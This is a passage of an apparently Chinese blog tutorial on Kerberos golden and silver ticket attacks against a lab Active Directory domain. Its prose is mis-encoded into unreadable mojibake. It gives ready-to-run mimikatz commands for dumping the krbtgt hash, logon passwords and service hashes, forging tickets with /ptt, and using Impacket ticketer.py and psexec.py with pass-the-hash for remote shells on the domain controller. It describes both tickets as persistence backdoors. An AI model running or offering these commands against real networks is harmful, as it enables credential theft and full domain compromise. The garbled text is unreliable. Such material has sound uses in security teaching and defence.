&lt;p&gt;è¿˜è®°å¾—&lt;a href=&#34;https://xxe.icu/posts/kerberos_authentication/#as_rep&#34;&gt;åŸŸæ¸—é€-Kerberosè®¤è¯&lt;/a&gt;ä¸­AS_REPçš„ticketä¸­enc-partå°±æ˜¯ä½¿ç”¨krbtgtåŠ å¯†åå‘è¿‡æ¥çš„TGTç¥¨æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‹¥æœ‰äº†krbtgtçš„Hashåå°±å¯ä»¥åˆ›å»ºåŸŸå†…ä»»æ„çš„ç”¨æˆ·ç”ŸæˆTGTç¥¨æ®ï¼Œç„¶åé‚£è¿™å¼ ç¥¨æ®å»è®¿é—®æœåŠ¡ã€‚æ¯”å¦‚æˆ‘æ‹¿krbtgtçš„Hashåˆ›å»ºåŸŸç®¡ç†administratorçš„TGTç¥¨æ®ï¼Œç„¶åæˆ‘å°±å¯ä»¥æ‹¿è¿™å¼ ç¥¨æ®å»è¯·æ±‚æœåŠ¡ï¼Œæ€»æ‰€å‘¨çŸ¥ï¼ŒåŸŸç®¡ç†æƒé™å¾ˆå¤§ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®æˆ˜-1&#34;&gt;å®æˆ˜&lt;/h2&gt;
&lt;p&gt;å‡å¦‚æˆ‘ä»¬ç°åœ¨çš„ç¯å¢ƒæ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;172.16.0.105ï¼šå†…ç½‘ä¸­çš„ä¸€å°æ™®é€šä¸»æœºï¼Œç°åœ¨æœ‰æ™®é€šåŸŸç”¨æˆ·luckyç™»å½•åˆ°ä¸Šé¢&lt;/p&gt;
&lt;p&gt;172.16.0.106ï¼šåŸŸæ§æœåŠ¡å™¨ï¼Œåç§°ä¸ºDC.hack.lab&lt;/p&gt;
&lt;p&gt;172.16.0.107ï¼šKali Linux&lt;/p&gt;
&lt;h3 id=&#34;mimikatz&#34;&gt;Mimikatz&lt;/h3&gt;
&lt;p&gt;å†å‡å¦‚æˆ‘ä»¬ä¸Šæ¬¡æ‹¿åˆ°äº†åŸŸæ§çš„æƒé™ï¼Œå¯¼å‡ºkrbtgtçš„ç¥¨æ®ï¼Œä½¿ç”¨çš„å·¥å…·æ˜¯mimikatzï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz # lsadump::lsa /inject /name:krbtgt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ–è€…&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz # lsadump::dcsync /user:krbtgt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;è®°ä¸‹NTLMå’Œã€åŸŸSIDï¼Œä¸‹é¢ä¼šç”¨å¾—ä¸Šã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨ç›®æ ‡ç®¡ç†å‘˜å·²ç»æŠŠåŸŸæ§çš„åé—¨å»æ‰ï¼Œè€Œä¸”ä¿®æ”¹äº†åŸŸç®¡ç†çš„å¯†ç ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨å°±æ˜¯é»„é‡‘ç¥¨æ®ä¸Šåœºçš„æ—¶å€™äº†ï¼Œæˆ‘ä»¬ç”¨æ™®é€šåŸŸç”¨æˆ·luckyç™»å½•åˆ°ä¸»æœº172.16.0.105ä¸­è¿›è¡Œæ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªå°±æ˜¯ç›´æ¥åœ¨ç”³è¯·ç¥¨æ®ï¼Œä¸€ä¸ªæ˜¯ç”Ÿæˆç¥¨æ®å†å¯¼å…¥ç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç›´æ¥ç”³è¯·ç¥¨æ®å†™å…¥å†…å­˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz # kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /krbtgt:79f9b4b4e9ffced451fb812cac908bb6 /user:fakeuser /ptt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åè¿œç¨‹è®¿é—®DCçš„Cç›˜ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;è®°å¾—æ¸…ç†ä¸‹ç³»ç»Ÿç¥¨æ®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;klist purge
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Mimikatz:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::purge
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯¼å‡ºç¥¨æ®å†å¯¼å…¥å†…å­˜ï¼Œæˆ‘ä»¬åœ¨åé¢åŠ ticketå³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz # kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /krbtgt:79f9b4b4e9ffced451fb812cac908bb6 /user:fakeuser /ticket:fakeuser.kiribi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿è¡Œåä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆfakeuser.kiribiæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨pttå¯¼å…¥å†…å­˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz # kerberos::ptt fakeuser.kiribi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;ç”ŸæˆGolden Ticketä¸ä»…å¯ä»¥ä½¿ç”¨aes256è¿˜å¯ä»¥ä½¿ç”¨rc4åŠ å¯†çš„å¯†é’¥&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;impacket&#34;&gt;Impacket&lt;/h3&gt;
&lt;p&gt;é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨impacketè¿›è¡Œåˆ¶ä½œé»„é‡‘ç¥¨æ®ï¼Œå®Œå…¨åœ¨kaliä¸Šæ“ä½œ,å½“ç„¶è¿™ä¸ªå·¥å…·ä¹Ÿå¯ä»¥åœ¨Windowsä¸Šä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;å¯èƒ½å¤§å®¶åœ¨kaliä¸Šä¼šé‡åˆ°ä¸‹é¢çš„æŠ¥é”™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[-] [Errno Connection error (HACK.LAB:88)] [Errno -2] Name or service not known
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ˜¯å› ä¸ºkaliçš„hostsæ–‡ä»¶å’Œkrb5-useråŒ…æ²¡å®‰è£…å¯¼è‡´çš„ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…krb5çš„krb5-useråŒ…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install krb5-user 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®/etc/hostsï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;è®¾ç½®/etc/krb5.confï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;default_realm =hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[realms]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		hack.lab = {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				kdc = tcp/dc:88
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆç”¨åŸŸç®¡ç†å‘˜è´¦æˆ·å¯†ç è·å–åˆ°krbtgtçš„hashï¼Œè¿™é‡Œä½¿ç”¨ä¸€ä¸ª&lt;a href=&#34;https://github.com/Secd0g/bat-armor/blob/master/examples/krbtgt.bat&#34;&gt;ç¼–ç ç‰ˆçš„mimikatz&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨psexec.pyè¿œç¨‹ç™»å½•åˆ°åŸŸæ§æ‰§è¡Œè¯»å–hashï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;psexec.py hack.lab/testuser@dc -hashes &lt;span class=&#34;s1&#34;&gt;&amp;#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&amp;#39;&lt;/span&gt; -c krbtgt.bat
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æ‹¿åˆ°krbtgtçš„hashå’ŒåŸŸçš„sidåï¼Œå†ä½¿ç”¨Impacketçš„ticketer.pyè„šæœ¬è¿›è¡Œå¯¼å‡ºé»„é‡‘ç¥¨æ®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ticketer.py -nthash 79f9b4b4e9ffced451fb812cac908bb6 -domain-sid S-1-5-21-3896163557-1645138957-2306563325 -domain hack.lab  testuser
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®ƒä¼šåœ¨ç›®å½•ä¸‹ç”Ÿæˆtestuser.ccacheæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè®¾ç½®ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;testuser.ccache
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åæ‰§è¡Œpsexecå³å¯è¿œç¨‹è®¿é—®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;psexec.py hack.lab/testuser@dc -k -no-pass
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;-k æ˜¯ä½¿ç”¨kerberosç¥¨æ®ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢è®¾ç½®çš„KRB5CCNAMEç¯å¢ƒå˜é‡&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;é™¤äº†psexecä»¥å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–å·¥å…·ä¾‹å¦‚wmiexec.pyï¼ˆå®ƒæ¯”psexec.pyæ›´åŠ éšè”½ï¼Œå› ä¸ºå®ƒä¸ä¼šä¸Šä¼ ä»»ä½•äºŒè¿›åˆ¶æ–‡ä»¶å¹¶ä¸”ä¸å¯åŠ¨ä»»ä½•æœåŠ¡ï¼‰æˆ–atexec.pyï¼ˆä½¿ç”¨è®¡åˆ’çš„ä»»åŠ¡æ‰§è¡Œä»£ç ï¼‰&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;0x04-ç™½é“¶ç¥¨æ®silver-ticket&#34;&gt;0x04 ç™½é“¶ç¥¨æ®ï¼ˆSilver Ticketï¼‰&lt;/h1&gt;
&lt;h2 id=&#34;åŸºæœ¬åŸç†-2&#34;&gt;åŸºæœ¬åŸç†&lt;/h2&gt;
&lt;p&gt;åœ¨TGS-REPé˜¶æ®µï¼ŒTGS_REPé‡Œé¢çš„ticketçš„enc-partæ˜¯ä½¿ç”¨æœåŠ¡çš„hashè¿›è¡ŒåŠ å¯†çš„ï¼Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰æœåŠ¡çš„hashï¼Œå°±å¯ä»¥ç»™æˆ‘ä»¬è‡ªå·±ç­¾å‘ä»»æ„ç”¨æˆ·çš„TGSç¥¨æ®ï¼ˆservice ticketï¼‰ï¼Œè¿™ä¸ªç¥¨æ®ä¹Ÿè¢«ç§°ä¸ºç™½é“¶ç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;ç›¸è¾ƒäºé»„é‡‘ç¥¨æ®ï¼Œç™½é“¶ç¥¨æ®ä½¿ç”¨è¦è®¿é—®æœåŠ¡çš„hashï¼Œè€Œä¸æ˜¯krbtgtçš„hashï¼Œç”±äºç”Ÿæˆçš„æ˜¯TGSç¥¨æ®ï¼Œä¸éœ€è¦è·ŸåŸŸæ§æ‰“äº¤é“ï¼Œä½†æ˜¯ç™½é“¶ç¥¨ç¥¨æ®åªèƒ½è®¿é—®ç‰¹å®šæœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œä¼ªé€ çš„ç™½é“¶ç¥¨æ®æ²¡æœ‰å¸¦æœ‰æœ‰æ•ˆKDCç­¾åçš„PACã€‚å¦‚æœå°†ç›®æ ‡ä¸»æœºé…ç½®ä¸ºéªŒè¯KDCPACç­¾åï¼Œåˆ™é“¶ç¥¨å°†ä¸èµ·ä½œç”¨ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸é»„é‡‘ç¥¨æ®çš„åŒºåˆ«&#34;&gt;ä¸é»„é‡‘ç¥¨æ®çš„åŒºåˆ«&lt;/h2&gt;
&lt;h3 id=&#34;è®¿é—®æƒé™ä¸åŒ&#34;&gt;è®¿é—®æƒé™ä¸åŒ&lt;/h3&gt;
&lt;p&gt;Golden Ticketæ˜¯ä¼ªé€ çš„TGT(Ticket Granting Ticket)ï¼Œæ‰€ä»¥å¯ä»¥è·å–ä»»ä½•KerberosæœåŠ¡æƒé™&lt;/p&gt;
&lt;p&gt;Silver Ticketæ˜¯ä¼ªé€ çš„TGSï¼Œä¹Ÿå°±æ˜¯è¯´å…¶èŒƒå›´æœ‰é™ï¼Œåªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡æƒé™&lt;/p&gt;
&lt;h3 id=&#34;åŠ å¯†æ–¹å¼ä¸åŒ&#34;&gt;åŠ å¯†æ–¹å¼ä¸åŒ&lt;/h3&gt;
&lt;p&gt;Golden Ticketæ˜¯ç”±krbtgtçš„hashåŠ å¯†&lt;/p&gt;
&lt;p&gt;Silver Ticketæ˜¯ç”±æœåŠ¡è´¦æˆ·ï¼ˆé€šå¸¸ä¸ºè®¡ç®—æœºè´¦æˆ·ï¼‰hashåŠ å¯†&lt;/p&gt;
&lt;h3 id=&#34;è®¤è¯æµç¨‹ä¸åŒ&#34;&gt;è®¤è¯æµç¨‹ä¸åŒ&lt;/h3&gt;
&lt;p&gt;Golden Ticketåœ¨ä½¿ç”¨çš„è¿‡ç¨‹éœ€è¦åŒåŸŸæ§é€šä¿¡&lt;/p&gt;
&lt;p&gt;Silver Ticketåœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸éœ€è¦åŒåŸŸæ§é€šä¿¡&lt;/p&gt;
&lt;h3 id=&#34;å…±åŒç‚¹&#34;&gt;å…±åŒç‚¹&lt;/h3&gt;
&lt;p&gt;éƒ½æ˜¯ç”¨æ¥åšåé—¨&lt;/p&gt;
&lt;h2 id=&#34;åˆ©ç”¨æ¡ä»¶&#34;&gt;åˆ©ç”¨æ¡ä»¶&lt;/h2&gt;
&lt;p&gt;æ”»å‡»è€…åœ¨ä½¿ç”¨Silver Ticketå¯¹å†…ç½‘è¿›è¡Œæ”»å‡»æ—¶ï¼Œéœ€è¦æŒæ¡ä»¥ä¸‹ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åŸŸå&lt;/li&gt;
&lt;li&gt;åŸŸSID&lt;/li&gt;
&lt;li&gt;ç›®æ ‡æœåŠ¡å™¨çš„FQDN&lt;/li&gt;
&lt;li&gt;å¯åˆ©ç”¨çš„æœåŠ¡&lt;/li&gt;
&lt;li&gt;æœåŠ¡è´¦å·çš„NTLM Hash&lt;/li&gt;
&lt;li&gt;éœ€è¦ä¼ªé€ çš„ç”¨æˆ·å&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;å®æˆ˜-2&#34;&gt;å®æˆ˜&lt;/h2&gt;
&lt;p&gt;ä¹Ÿå°±æ˜¯è¯´åªè¦æ‰‹é‡Œæœ‰Silver Ticketï¼Œå°±å¯ä»¥è·³è¿‡KDCè®¤è¯ï¼Œç›´æ¥å»è®¿é—®æŒ‡å®šçš„æœåŠ¡ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¼ªé€ cifsæœåŠ¡æƒé™&#34;&gt;ä¼ªé€ CIFSæœåŠ¡æƒé™&lt;/h3&gt;
&lt;p&gt;CIFSæœåŠ¡é€šå¸¸ç”¨äºWindowsä¸»æœºä¹‹é—´çš„æ–‡ä»¶å…±äº«ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨è·å–åˆ°æŸä¸€å°ä¸»æœºçš„ç®¡ç†å‘˜æƒé™ï¼Œæˆ–è€…ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬éƒ½åœ¨åŸŸæ§ä¸Šé¢åšç™½é“¶ç¥¨æ®ï¼Œç•™ä½œåé—¨ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬åœ¨åŸŸæ§ä¸Šä½¿ç”¨mimikatzè·å–ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz log &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;ä½¿ç”¨logä¼šæŠŠæ‰§è¡Œè®°å½•ç”Ÿæˆåœ¨å½“å‰ç›®å½•ï¼Œæ–¹ä¾¿å¤åˆ¶&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆ‘ä»¬æ‰¾åˆ°ä»¥usernameä¸ºä¸»æœºåç§°çš„ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;è·å–SIDå€¼ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;whoami /all
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨æ„è¦å»æ‰-500&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ•´ç†ä»¥ä¸Šè·å¾—çš„ä¿¡æ¯å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/domain:hack.lab&lt;/li&gt;
&lt;li&gt;/sid:S-1-5-21-3896163557-1645138957-2306563325&lt;/li&gt;
&lt;li&gt;/target:dc.hack.lab&lt;/li&gt;
&lt;li&gt;/service:cifs&lt;/li&gt;
&lt;li&gt;/rc4:b21153e3b2ca87bc4b2031f2a9726613&lt;/li&gt;
&lt;li&gt;/user:fakeuser&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è®°å¾—æ¸…ç†ä¸‹ç³»ç»Ÿç¥¨æ®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;klist purge
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Mimikatz:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kerberos::purge
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç°åœ¨æ¥åˆ°æˆ‘ä»¬æ™®é€šåŸŸç”¨æˆ·ä¸‹çš„win7ï¼ˆ172.16.0.105ï¼‰æ‰§è¡Œmimikatzï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz &amp;#34;kerberos::golden /domain:hack.lab /sid:S-1-5-21-3896163557-1645138957-2306563325 /target:dc.hack.lab /service:cifs /rc4:b21153e3b2ca87bc4b2031f2a9726613 /user:fakeuser /ptt&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œå®Œæˆ‘ä»¬å°±å¯ä»¥è®¿é—®dcæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_ptt/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ä¼ªé€ ldapæœåŠ¡æƒé™&#34;&gt;ä¼ªé€ LDAPæœåŠ¡æƒé™&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥ä½¿ç”¨dcsyncä»åŸŸæ§æœåŠ¡å™¨ä¸­è·å–æŒ‡å®šç”¨æˆ·çš„æ•£åˆ—å€¼ï¼Œæ¯”å¦‚krbtgtã€‚ç°åœ¨æˆ‘ä»¬ä½¿ç”¨mimikatzå®éªŒè·å–krbtgtçš„å¯†ç æ•£åˆ—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lsadump::dcsync /dc:dc.hack.lab /domain:hack.lab /user:krbtgt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°æ˜¯æ— æ³•è·å–çš„ï¼š&lt;/p&gt;
